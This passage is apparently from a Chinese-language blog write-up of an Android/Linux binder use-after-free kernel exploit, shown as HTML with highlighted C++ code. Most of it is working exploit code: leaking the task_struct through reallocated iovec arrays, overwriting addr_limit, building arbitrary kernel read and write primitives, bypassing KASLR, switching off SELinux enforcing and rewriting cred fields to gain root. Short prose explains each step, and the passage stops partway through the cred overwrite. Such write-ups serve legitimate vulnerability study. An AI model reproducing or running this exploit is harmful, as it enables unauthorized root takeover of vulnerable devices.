            ERR(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">[-] CHILD: read failed. nBytesRead: 0x%lx, expected: 0x%x&#34;</span>, nBytesRead, PAGE_SIZE);
            exit(EXIT_FAILURE);
        }
        exit(EXIT_SUCCESS);
    }
    <span style="color:#75715e">// parent process
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// I have seen some races which hinders the reallocation.
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// So, now freeing the binder_thread after fork.
</span><span style="color:#75715e"></span>    <span style="color:#75715e">//
</span><span style="color:#75715e"></span>    freeBinderThread();
    <span style="color:#75715e">//
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// Reallocate binder_thread as iovec array
</span><span style="color:#75715e"></span>    <span style="color:#75715e">//
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// We need to make sure this writev call blocks
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// This will only happen when the pipe is already full
</span><span style="color:#75715e"></span>
    <span style="color:#75715e">// This print statement was ruining the reallocation,
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// spent a night to figure this out. Commenting the
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// below line.
</span><span style="color:#75715e"></span>    <span style="color:#75715e">//
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// INFO(&#34;[+] Reallocating binder_thread\n&#34;);
</span><span style="color:#75715e"></span>
    ssize_t nBytesWritten <span style="color:#f92672">=</span> writev(pipe_fd[<span style="color:#ae81ff">1</span>], iovecStack, IOVEC_COUNT);
    <span style="color:#75715e">// If the corruption was successful, the total bytes written
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// should be equal to 0x2000. This is because there are two
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// valid iovec and the length of each is 0x1000
</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> (nBytesWritten <span style="color:#f92672">!=</span> PAGE_SIZE <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span>) {
        ERR(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">[-] writev failed. nBytesWritten: 0x%lx, expected: 0x%x</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, nBytesWritten, PAGE_SIZE <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span>);
        exit(EXIT_FAILURE);
    } <span style="color:#66d9ef">else</span> {
        INFO(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">[*] Wrote 0x%lx bytes</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, nBytesWritten);
    }
    <span style="color:#75715e">// Now read the actual data from the corrupted iovec
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// This is the leaked data from kernel address space
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// and will contain the task_struct pointer
</span><span style="color:#75715e"></span>    nBytesRead <span style="color:#f92672">=</span> read(pipe_fd[<span style="color:#ae81ff">0</span>], dataBuffer, <span style="color:#66d9ef">sizeof</span>(dataBuffer));
    <span style="color:#66d9ef">if</span> (nBytesRead <span style="color:#f92672">!=</span> PAGE_SIZE) {
        ERR(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">[-] read failed. nBytesRead: 0x%lx, expected: 0x%x&#34;</span>, nBytesRead, PAGE_SIZE);
        exit(EXIT_FAILURE);
    }
    <span style="color:#75715e">// Wait for the child process to exit
</span><span style="color:#75715e"></span>    wait(nullptr);
    m_task_struct <span style="color:#f92672">=</span> (<span style="color:#66d9ef">struct</span> task_struct <span style="color:#f92672">*</span>) <span style="color:#f92672">*</span>((int64_t <span style="color:#f92672">*</span>) (dataBuffer <span style="color:#f92672">+</span> TASK_STRUCT_OFFSET_IN_LEAKED_DATA));

    m_pidAddress <span style="color:#f92672">=</span> (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>) ((int8_t <span style="color:#f92672">*</span>) m_task_struct <span style="color:#f92672">+</span> offsetof(<span style="color:#66d9ef">struct</span> task_struct, pid));
    m_credAddress <span style="color:#f92672">=</span> (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>) ((int8_t <span style="color:#f92672">*</span>) m_task_struct <span style="color:#f92672">+</span> offsetof(<span style="color:#66d9ef">struct</span> task_struct, cred));
    m_nsproxyAddress <span style="color:#f92672">=</span> (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>) ((int8_t <span style="color:#f92672">*</span>) m_task_struct <span style="color:#f92672">+</span> offsetof(<span style="color:#66d9ef">struct</span> task_struct, nsproxy));
    INFO(<span style="color:#e6db74">&#34;[+] Leaked task_struct: %p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, m_task_struct);
    INFO(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">[*] &amp;task_struct-&gt;pid: %p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, m_pidAddress);
    INFO(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">[*] &amp;task_struct-&gt;cred: %p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, m_credAddress);
    INFO(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">[*] &amp;task_struct-&gt;nsproxy: %p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, m_nsproxyAddress);
}
</code></pre></div><p>很好理解，exp这部分首先初始化环境之后创建用于readv和writev的pipe，readv和writev函数用于在一次函数调用中读、写多个非连续缓冲区。修改pipe的size为0x1000。</p>
<p>之后创建了25个iovec，放在iovecStack里面。25个是根据binder_thread和iovec的大小算出来</p>
<p><code>IOVEC_WQ_INDEX (int) = (offsetof(struct binder_thread, wait) / sizeof(struct iovec))</code></p>
<p>binder_thread结构体大小为408，25个iovec大小为25*16=400，正好。计算对比<strong>binder_thread</strong>中wait.head的偏移0xA0和<strong>iovecStack</strong>的偏移iovecStack[10].iov_len匹配。</p>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20200629155854.png" alt=""></p>
<p>前面动态调试时也能看到会有两个地址的值会被写入地址，这里相对应的位置为iovecStack[10].iov_len 和iovecStack[11].io_base。所以我们这里要修改iovecStack[10]的iov_len和pipe一样的大小，阻塞掉父进程的writev系统调用，再去触发unlink操作。</p>
<p>这里的iovecStack[10].io_base正好对上binder_thread-&gt;wait.lock，如果这个值不为0的话，后面在尝试取自旋锁锁会出问题，不进行unlink操作，这个值是32bit的，iov_base是64bit的，所以要设置对齐，使用mmap保证低32bit为0。</p>
<p>iovecStack[10].iov_len和iovecStack[11].iov_len设置为pipe size的大小，iovecStack[11].io_base 设置为新分配的一个地址，</p>
<p>创建fork子进程进行EPOLL_CTL_DEL操作触发unlink。读出0x1000 bytes的垃圾数据恢复进程，</p>
<p>父进程free掉binder_thread，调用writev系统进行阻塞，等待子进程完成。</p>
<p>最后父进程在调用read读出已经被子进程覆盖了内核地址处的数据，根据偏移读出泄露的task_struct指针。</p>
<p>下面这张图是<strong>Project Zero</strong> blog贴出来的流程图，方便理解整个过程。</p>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20200629014014.png" alt=""></p>
<p>既然已经有task_struct指针，接下来就可以patch 掉AddrLimit。直接看exp实现。</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">void</span> BinderUaF<span style="color:#f92672">::</span>clobberAddrLimit() {
    <span style="color:#66d9ef">int</span> sock_fd[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>};
    ssize_t nBytesWritten <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
    <span style="color:#66d9ef">struct</span> msghdr message <span style="color:#f92672">=</span> {nullptr};
    <span style="color:#66d9ef">struct</span> iovec iovecStack[IOVEC_COUNT] <span style="color:#f92672">=</span> {nullptr};
    <span style="color:#75715e">// Get binder fd
</span><span style="color:#75715e"></span>    setupBinder();
    <span style="color:#75715e">// Create event poll
</span><span style="color:#75715e"></span>    setupEventPoll();
    INFO(<span style="color:#e6db74">&#34;[+] Setting up socket</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
    <span style="color:#66d9ef">if</span> (socketpair(AF_UNIX, SOCK_STREAM, <span style="color:#ae81ff">0</span>, sock_fd) <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
        ERR(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">[-] Unable to create socketpair</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
        exit(EXIT_FAILURE);
    } <span style="color:#66d9ef">else</span> {
        INFO(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">[*] Socketpair created successfully</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
    }
    <span style="color:#75715e">//
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// We will just write junk data to socket so that when recvmsg
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// is called it process the fist valid iovec with this junk data
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// and then blocks and waits for the rest of the data to be received
</span><span style="color:#75715e"></span>    <span style="color:#75715e">//
</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">char</span> junkSocketData[] <span style="color:#f92672">=</span> {
            <span style="color:#ae81ff">0x41</span>
    };
    INFO(<span style="color:#e6db74">&#34;[+] Writing junk data to socket</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
    nBytesWritten <span style="color:#f92672">=</span> write(sock_fd[<span style="color:#ae81ff">1</span>], <span style="color:#f92672">&amp;</span>junkSocketData, <span style="color:#66d9ef">sizeof</span>(junkSocketData));
    <span style="color:#66d9ef">if</span> (nBytesWritten <span style="color:#f92672">!=</span> <span style="color:#66d9ef">sizeof</span>(junkSocketData)) {
        ERR(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">[-] write failed. nBytesWritten: 0x%lx, expected: 0x%lx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, nBytesWritten, <span style="color:#66d9ef">sizeof</span>(junkSocketData));
        exit(EXIT_FAILURE);
    }
    <span style="color:#75715e">//
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// Write junk data to the socket so that when recvmsg is
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// called, it process the first valid iovec with this junk
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// data and then blocks for the rest of the incoming socket data
</span><span style="color:#75715e"></span>    <span style="color:#75715e">//
</span><span style="color:#75715e"></span>    INFO(<span style="color:#e6db74">&#34;[+] Setting up iovecs</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
    <span style="color:#75715e">// We want to block after processing the iovec at IOVEC_WQ_INDEX,
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// because then, we can trigger the unlink operation and get the
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// next iovecs corrupted to gain scoped write.
</span><span style="color:#75715e"></span>    mmap4gbAlignedPage();
    iovecStack[IOVEC_WQ_INDEX].iov_base <span style="color:#f92672">=</span> m_4gb_aligned_page;
    iovecStack[IOVEC_WQ_INDEX].iov_len <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
    iovecStack[IOVEC_WQ_INDEX <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>].iov_base <span style="color:#f92672">=</span> (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>) <span style="color:#ae81ff">0x41414141</span>;
    iovecStack[IOVEC_WQ_INDEX <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>].iov_len <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x8</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x8</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x8</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x8</span>;
    iovecStack[IOVEC_WQ_INDEX <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span>].iov_base <span style="color:#f92672">=</span> (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>) <span style="color:#ae81ff">0x42424242</span>;
    iovecStack[IOVEC_WQ_INDEX <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span>].iov_len <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x8</span>;
    <span style="color:#75715e">//
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// Prepare the data buffer that will be written to socket
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// Setting addr_limit to 0xFFFFFFFFFFFFFFFF in arm64
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// will result in crash because of a check in do_page_fault
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// However, x86_64 does not have this check. But it&#39;s better
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// to set it to 0xFFFFFFFFFFFFFFFE so that this same code can
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// be used in arm64 as well.
</span><span style="color:#75715e"></span>    <span style="color:#75715e">//
</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">static</span> uint64_t finalSocketData[] <span style="color:#f92672">=</span> {
            <span style="color:#ae81ff">0x1</span>,                    <span style="color:#75715e">// iovecStack[IOVEC_WQ_INDEX].iov_len
</span><span style="color:#75715e"></span>            <span style="color:#ae81ff">0x41414141</span>,             <span style="color:#75715e">// iovecStack[IOVEC_WQ_INDEX + 1].iov_base
</span><span style="color:#75715e"></span>            <span style="color:#ae81ff">0x8</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x8</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x8</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x8</span>,  <span style="color:#75715e">// iovecStack[IOVEC_WQ_INDEX + 1].iov_len
</span><span style="color:#75715e"></span>            (uint64_t) ((uint8_t <span style="color:#f92672">*</span>) m_task_struct <span style="color:#f92672">+</span>
                        OFFSET_TASK_STRUCT_ADDR_LIMIT), <span style="color:#75715e">// iovecStack[IOVEC_WQ_INDEX + 2].iov_base
</span><span style="color:#75715e"></span>            <span style="color:#ae81ff">0xFFFFFFFFFFFFFFFE</span>      <span style="color:#75715e">// addr_limit value
</span><span style="color:#75715e"></span>    };
    <span style="color:#75715e">//
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// Prepare the message
</span><span style="color:#75715e"></span>    <span style="color:#75715e">//
</span><span style="color:#75715e"></span>    message.msg_iov <span style="color:#f92672">=</span> iovecStack;
    message.msg_iovlen <span style="color:#f92672">=</span> IOVEC_COUNT;
    <span style="color:#75715e">//
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// Now link the poll wait queue to binder thread wait queue
</span><span style="color:#75715e"></span>    <span style="color:#75715e">//
</span><span style="color:#75715e"></span>    linkEventPollWaitQueueToBinderThreadWaitQueue();
    <span style="color:#75715e">//
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// We should trigger the unlink operation when we
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// have the binder_thread reallocated as iovec array
</span><span style="color:#75715e"></span>
    <span style="color:#75715e">// Now fork
</span><span style="color:#75715e"></span>    pid_t childPid <span style="color:#f92672">=</span> fork();
    <span style="color:#66d9ef">if</span> (childPid <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
        <span style="color:#75715e">//
</span><span style="color:#75715e"></span>        <span style="color:#75715e">// child process
</span><span style="color:#75715e"></span>        <span style="color:#75715e">// There is a race window between the unlink and blocking
</span><span style="color:#75715e"></span>        <span style="color:#75715e">// in writev, so sleep for a while to ensure that we are
</span><span style="color:#75715e"></span>        <span style="color:#75715e">// blocking in writev before the unlink happens
</span><span style="color:#75715e"></span>        <span style="color:#75715e">//
</span><span style="color:#75715e"></span>        sleep(<span style="color:#ae81ff">2</span>);
        <span style="color:#75715e">//
</span><span style="color:#75715e"></span>        <span style="color:#75715e">// Trigger the unlink operation on the reallocated chunk
</span><span style="color:#75715e"></span>        <span style="color:#75715e">//
</span><span style="color:#75715e"></span>        unlinkEventPollWaitQueueFromBinderThreadWaitQueue();
        <span style="color:#75715e">//
</span><span style="color:#75715e"></span>        <span style="color:#75715e">// Now, at this point, the iovecStack[IOVEC_WQ_INDEX].iov_len
</span><span style="color:#75715e"></span>        <span style="color:#75715e">// and iovecStack[IOVEC_WQ_INDEX + 1].iov_base is clobbered
</span><span style="color:#75715e"></span>        <span style="color:#75715e">//
</span><span style="color:#75715e"></span>        <span style="color:#75715e">// Write rest of the data to the socket so that recvmsg starts
</span><span style="color:#75715e"></span>        <span style="color:#75715e">// processing the corrupted iovecs and we get scoped write and
</span><span style="color:#75715e"></span>        <span style="color:#75715e">// finally arbitrary write
</span><span style="color:#75715e"></span>        nBytesWritten <span style="color:#f92672">=</span> write(sock_fd[<span style="color:#ae81ff">1</span>], finalSocketData, <span style="color:#66d9ef">sizeof</span>(finalSocketData));
        <span style="color:#66d9ef">if</span> (nBytesWritten <span style="color:#f92672">!=</span> <span style="color:#66d9ef">sizeof</span>(finalSocketData)) {
            ERR(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">[-] write failed. nBytesWritten: 0x%lx, expected: 0x%lx&#34;</span>, nBytesWritten, <span style="color:#66d9ef">sizeof</span>(finalSocketData));
            exit(EXIT_FAILURE);
        }
        exit(EXIT_SUCCESS);
    }
    <span style="color:#75715e">// parent process
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// I have seen some races which hinders the reallocation.
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// So, now freeing the binder_thread after fork.
</span><span style="color:#75715e"></span>    freeBinderThread();
    <span style="color:#75715e">// Reallocate binder_thread as iovec array and
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// we need to make sure this recvmsg call blocks.
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// recvmsg will block after processing a valid iovec at
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// iovecStack[IOVEC_WQ_INDEX]
</span><span style="color:#75715e"></span>    ssize_t nBytesReceived <span style="color:#f92672">=</span> recvmsg(sock_fd[<span style="color:#ae81ff">0</span>], <span style="color:#f92672">&amp;</span>message, MSG_WAITALL);
    <span style="color:#75715e">// If the corruption was successful, the total bytes received
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// should be equal to length of all iovec. This is because there
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// are three valid iovec
</span><span style="color:#75715e"></span>    ssize_t expectedBytesReceived <span style="color:#f92672">=</span> iovecStack[IOVEC_WQ_INDEX].iov_len <span style="color:#f92672">+</span>
                                    iovecStack[IOVEC_WQ_INDEX <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>].iov_len <span style="color:#f92672">+</span>
                                    iovecStack[IOVEC_WQ_INDEX <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span>].iov_len;
    <span style="color:#66d9ef">if</span> (nBytesReceived <span style="color:#f92672">!=</span> expectedBytesReceived) {
        ERR(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">[-] recvmsg failed. nBytesReceived: 0x%lx, expected: 0x%lx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, nBytesReceived, expectedBytesReceived);
        exit(EXIT_FAILURE);
    }
    <span style="color:#75715e">// Wait for the child process to exit
</span><span style="color:#75715e"></span>    wait(nullptr);
}
</code></pre></div><p>这里就要将addr_limit的值改为<code>0xFFFFFFFFFFFFFFFE</code>在arm64里有个检查函数<code>do_page_fault</code>会检测该值是否为<code>0xFFFFFFFFFFFFFFFF</code>，如果是就触发奔溃，所以一般都设为<code>0xFFFFFFFFFFFFFFFE</code>。</p>
<p>前面是从内核读出数据，这里要实现的是向内核写入数据。</p>
<p>看看这里的iovecStack结构：</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">    iovecStack[IOVEC_WQ_INDEX].iov_base <span style="color:#f92672">=</span> m_4gb_aligned_page;
    iovecStack[IOVEC_WQ_INDEX].iov_len <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
    iovecStack[IOVEC_WQ_INDEX <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>].iov_base <span style="color:#f92672">=</span> (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>) <span style="color:#ae81ff">0x41414141</span>;
    iovecStack[IOVEC_WQ_INDEX <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>].iov_len <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x8</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x8</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x8</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x8</span>;
    iovecStack[IOVEC_WQ_INDEX <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span>].iov_base <span style="color:#f92672">=</span> (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>) <span style="color:#ae81ff">0x42424242</span>;
    iovecStack[IOVEC_WQ_INDEX <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span>].iov_len <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x8</span>;
</code></pre></div><p>和前面泄露信息的布局是差不多。</p>
<p>首先依然是初始化环境，先向socket写入了1byte的垃圾数据，之后父进程使用<code>recvmsg</code>系统调用接收了1byte的数据之后进行阻塞，这里选用了recvmsg而不是前面writev是因为iovecStack[10].iov_len变成了一个指针，很大的数字，后续调用copy_page_to_iter_iovec复制数据时会出错。</p>
<p>子进程进行unlink操作，将精心构造的finalSocketData写入socket，父进程恢复接收数据，这时iovecStack[11]已经被破坏掉了，等到recvmsg系统调用返回时，就可以修改掉addr_limit的值。</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">static</span> uint64_t finalSocketData[] <span style="color:#f92672">=</span> {
            <span style="color:#ae81ff">0x1</span>,                    <span style="color:#75715e">// iovecStack[IOVEC_WQ_INDEX].iov_len
</span><span style="color:#75715e"></span>            <span style="color:#ae81ff">0x41414141</span>,             <span style="color:#75715e">// iovecStack[IOVEC_WQ_INDEX + 1].iov_base
</span><span style="color:#75715e"></span>            <span style="color:#ae81ff">0x8</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x8</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x8</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x8</span>,  <span style="color:#75715e">// iovecStack[IOVEC_WQ_INDEX + 1].iov_len
</span><span style="color:#75715e"></span>            (uint64_t) ((uint8_t <span style="color:#f92672">*</span>) m_task_struct <span style="color:#f92672">+</span>
                        OFFSET_TASK_STRUCT_ADDR_LIMIT), <span style="color:#75715e">// iovecStack[IOVEC_WQ_INDEX + 2].iov_base
</span><span style="color:#75715e"></span>            <span style="color:#ae81ff">0xFFFFFFFFFFFFFFFE</span>      <span style="color:#75715e">// addr_limit value
</span><span style="color:#75715e"></span>    };
</code></pre></div><p>对应上面的值。</p>
<p>到这里我们就有了完整的内核读写权限，接下绕过kaslr、禁用SElinux、patchCred就可以获得root权限。</p>
<h4 id="bypass-kaslr-and-disabling-selinux">bypass kaslr and Disabling SELinux</h4>
<p>前面已经了有了完整的读写权限，那这就很简单了。</p>
<p>任意读写的实现：</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#66d9ef">void</span> BinderUaF<span style="color:#f92672">::</span>kRead(<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>Address, size_t Length, <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>uBuffer) {
    ssize_t nBytesWritten <span style="color:#f92672">=</span> write(m_kernel_rw_pipe_fd[<span style="color:#ae81ff">1</span>], Address, Length);
    <span style="color:#66d9ef">if</span> ((size_t) nBytesWritten <span style="color:#f92672">!=</span> Length) {
        ERR(<span style="color:#e6db74">&#34;[-] Failed to write data from kernel: %p&#34;</span>, Address);
        exit(EXIT_FAILURE);
    }
    ssize_t nBytesRead <span style="color:#f92672">=</span> read(m_kernel_rw_pipe_fd[<span style="color:#ae81ff">0</span>], uBuffer, Length);
    <span style="color:#66d9ef">if</span> ((size_t) nBytesRead <span style="color:#f92672">!=</span> Length) {
        ERR(<span style="color:#e6db74">&#34;[-] Failed to read data from kernel: %p&#34;</span>, Address);
        exit(EXIT_FAILURE);
    }
}

<span style="color:#66d9ef">void</span> BinderUaF<span style="color:#f92672">::</span>kWrite(<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>Address, size_t Length, <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>uBuffer) {
    ssize_t nBytesWritten <span style="color:#f92672">=</span> write(m_kernel_rw_pipe_fd[<span style="color:#ae81ff">1</span>], uBuffer, Length);
    <span style="color:#66d9ef">if</span> ((size_t) nBytesWritten <span style="color:#f92672">!=</span> Length) {
        ERR(<span style="color:#e6db74">&#34;[-] Failed to write data from user: %p&#34;</span>, Address);
        exit(EXIT_FAILURE);
    }
    ssize_t nBytesRead <span style="color:#f92672">=</span> read(m_kernel_rw_pipe_fd[<span style="color:#ae81ff">0</span>], Address, Length);
    <span style="color:#66d9ef">if</span> ((size_t) nBytesRead <span style="color:#f92672">!=</span> Length) {
        ERR(<span style="color:#e6db74">&#34;[-] Failed to write data to kernel: %p&#34;</span>, Address);
        exit(EXIT_FAILURE);
    }
}
</code></pre></div><p>任意读的话，利用write和read两个系统调用，使用write将数据写到pipe，并在管道的另一端read一个内核地址，就可以将数据写入该内核地址。任意写的话，与之相反。这样就实现了任意读写。</p>
<p>task_struct 有一个全局指针nsproxy ，前面已经泄露出来了，就可以更具偏移直接算出Kernel_base_addr。</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">    ptrdiff_t kernelBase <span style="color:#f92672">=</span> nsProxy <span style="color:#f92672">-</span> SYMBOL_OFFSET_init_nsproxy;
    <span style="color:#66d9ef">auto</span> selinuxEnforcing <span style="color:#f92672">=</span> (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>) (kernelBase <span style="color:#f92672">+</span> SYMBOL_OFFSET_selinux_enforcing);
    INFO(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">[*] nsproxy: 0x%lx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, nsProxy);
    INFO(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">[*] Kernel base: 0x%lx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, kernelBase);
    INFO(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">[*] selinux_enforcing: %p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, selinuxEnforcing);
    <span style="color:#66d9ef">int</span> selinuxEnabled <span style="color:#f92672">=</span> kReadDword(selinuxEnforcing);
    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>selinuxEnabled) {
        INFO(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">[*] selinux enforcing is disabled</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
        <span style="color:#66d9ef">return</span>;
    }
    INFO(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">[*] selinux enforcing is enabled</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);

    kWriteDword(selinuxEnforcing, <span style="color:#ae81ff">0x0</span>);
</code></pre></div><p>这里只需要对于SELinux只需根据kernelBase 计算出具体的地址，再直接进行写入0x0即可禁用掉。</p>
<p>现在的版本越来越多保护和检查机制，实际上直接这样不一定是不可行，有时得恢复kallsyms表才行</p>
<h4 id="root">Root</h4>
<p>提权的常用语句<code>commit_creds(prepare_kernel_cred(NULL));</code>，这就是常规的套路了。</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">    kWriteDword((<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>) ((uint8_t <span style="color:#f92672">*</span>) m_cred <span style="color:#f92672">+</span> offsetof(<span style="color:#66d9ef">struct</span> cred, uid)), GLOBAL_ROOT_UID);
    kWriteDword((<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>) ((uint8_t <span style="color:#f92672">*</span>) m_cred <span style="color:#f92672">+</span> offsetof(<span style="color:#66d9ef">struct</span> cred, gid)), GLOBAL_ROOT_GID);
    kWriteDword((<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>) ((uint8_t <span style="color:#f92672">*</span>) m_cred <span style="color:#f92672">+</span> offsetof(<span style="color:#66d9ef">struct</span> cred, suid)), GLOBAL_ROOT_UID);
